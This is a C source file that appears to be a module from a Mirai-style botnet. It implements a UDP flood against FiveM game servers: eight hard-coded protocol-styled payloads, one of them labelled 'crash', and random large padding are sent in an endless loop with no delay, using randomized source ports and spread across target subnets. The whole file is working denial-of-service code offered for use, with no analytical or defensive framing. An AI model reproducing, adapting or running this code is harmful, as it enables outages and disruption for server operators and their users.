#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <pthread.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"
#include "udp_common.h"

#define MAX_THREADS 100

void attack_fivem(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 30120);
    uint16_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 4096);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    
    // FiveM Official Payloads
    unsigned char fivem_info[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x18, 0x00, 0x00, 0x00,
        0x69, 0x6E, 0x66, 0x6F, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_connect[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x13, 0x00, 0x00, 0x00,
        0x63, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x69,
        0x6F, 0x6E, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_heartbeat[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x0C, 0x00, 0x00, 0x00,
        0x68, 0x65, 0x61, 0x72, 0x74, 0x62, 0x65, 0x61, 0x74, 0x00
    };
    
    unsigned char fivem_resources[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x1F, 0x00, 0x00, 0x00,
        0x67, 0x65, 0x74, 0x5F, 0x72, 0x65, 0x73, 0x6F,
        0x75, 0x72, 0x63, 0x65, 0x73, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_players[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x10, 0x00, 0x00, 0x00,
        0x70, 0x6C, 0x61, 0x79, 0x65, 0x72, 0x73, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_rcon[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x0E, 0x00, 0x00, 0x00,
        0x72, 0x63, 0x6F, 0x6E, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_crash[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_status[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x09, 0x00, 0x00, 0x00,
        0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    // Create UDP socket
    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd == -1)
        return;
    
    // Socket optimization
    int yes = 1;
    int buffer_size = 32 * 1024 * 1024; // 32MB buffer
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Prepare targets
    for (i = 0; i < targs_len; i++) {
        if (port == 0xffff)
            targs[i].sock_addr.sin_port = htons(30120 + (rand_next() % 200));
        else
            targs[i].sock_addr.sin_port = htons(port);
        
        targs[i].sock_addr.sin_family = AF_INET;
        
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }
    
    // Main attack loop - MAX SPEED
    while (1) {
        for (i = 0; i < targs_len; i++) {
            // Change source port randomly for each packet
            if (sport == 0xffff) {
                struct sockaddr_in bind_addr;
                memset(&bind_addr, 0, sizeof(bind_addr));
                bind_addr.sin_family = AF_INET;
                bind_addr.sin_port = htons(rand_next() & 0xffff);
                bind_addr.sin_addr.s_addr = INADDR_ANY;
                bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
            }
            
            // Send ALL 8 payloads at maximum speed
            sendto(fd, fivem_info, sizeof(fivem_info), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_connect, sizeof(fivem_connect), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_heartbeat, sizeof(fivem_heartbeat), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_resources, sizeof(fivem_resources), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_players, sizeof(fivem_players), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_rcon, sizeof(fivem_rcon), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_crash, sizeof(fivem_crash), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_status, sizeof(fivem_status), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            
            // Send random large data to consume bandwidth
            if (data_rand && data_len > 0) {
                char *rand_data = malloc(data_len);
                if (rand_data) {
                    rand_str(rand_data, data_len);
                    sendto(fd, rand_data, data_len, MSG_NOSIGNAL,
                           (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    free(rand_data);
                }
            }
        }
        // No delay for maximum speed
    }
}
